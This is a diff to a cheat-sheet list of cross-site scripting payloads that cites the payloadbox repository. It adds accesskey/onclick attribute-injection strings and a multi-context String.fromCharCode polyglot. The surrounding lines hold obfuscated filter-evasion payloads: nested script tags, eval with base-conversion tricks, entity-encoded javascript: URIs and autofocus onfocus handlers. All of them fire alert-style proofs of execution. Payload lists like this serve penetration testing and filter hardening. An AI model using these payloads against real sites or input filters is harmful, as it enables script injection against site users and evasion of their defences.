@@ -1,6 +1,8 @@
 https://github.com/payloadbox/xss-payload-list
 
 XSS PAYLOADS <3
+hidalg0d"accesskey=x+onclick="+alert(1)
+hidalg0d' accesskey=x onclick=alert(1) '
 <inpuT autofocus oNFocus​="setTimeout(function() { /*\`*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\`*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
@@ -10,6 +12,9 @@ XSS PAYLOADS <3
 <script>eval('\x61lert(\'33\')')</script>
 <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
 <object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+` '%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.  
+fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode  
+(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--><%2fSCRIPT>">'><​SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT> `
 
 IF ALERT IS BLOCKED
 
